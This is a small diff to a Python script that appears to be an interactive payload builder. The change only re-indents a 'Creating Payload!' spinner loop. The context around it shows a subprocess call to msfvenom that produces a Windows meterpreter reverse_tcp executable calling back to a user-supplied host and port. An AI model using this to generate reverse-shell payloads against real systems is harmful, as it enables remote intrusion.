@@ -104,8 +104,8 @@ def main():
            lHost = input("Choose target IP: ")
            lPort = input("Choose target port: ")
            for i in range(40):
-           time.sleep(0.25)
-           print("Creating Payload!" + spinner[i % len(spinner)], end="\r")
+            time.sleep(0.25)
+            print("Creating Payload!" + spinner[i % len(spinner)], end="\r")
            
            subprocess.run(['msfvenom', '-p', 'windows/meterpreter/reverse_tcp', 'LHOST=' + lHost, 'LPORT=' + lPort, '-f', 'exe', '-o', output])
         elif answer == "n":
